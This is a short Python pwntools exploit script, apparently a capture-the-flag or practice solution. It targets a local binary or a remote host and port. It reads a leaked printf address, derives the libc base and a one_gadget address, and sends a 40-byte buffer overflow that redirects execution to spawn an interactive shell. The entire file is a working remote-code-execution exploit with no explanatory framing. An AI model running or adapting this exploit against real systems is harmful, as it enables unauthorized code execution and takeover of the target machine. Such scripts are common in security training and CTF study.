import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###

printf_offset = 0x64e80
one_gadget_offset = 0x4f2c5

    ###main###
def main():
    logging.info("main!!")
    
    ###payload###
    payload = b"A"* 40
    
    
    _ = target.recvuntil("Here I am: 0x")
    printf_addr = target.recvline()
    print(printf_addr)
    printf_addr = int(printf_addr, 16)
    logging.info("printf_addr: " + hex(printf_addr))

    libc_addr = printf_addr - printf_offset
    logging.info("libc_addr: " + hex(libc_addr))
    one_gadget_rce = libc_addr + one_gadget_offset
    logging.info("one_gadget_rce: " + hex(one_gadget_rce))

    
    #payload += p64(printf_addr)
    payload += p64(one_gadget_rce)

    
    target.sendline(payload)
    #ret = target.recvuntil("")
    

    target.interactive()

if __name__ == "__main__":
    main()


            
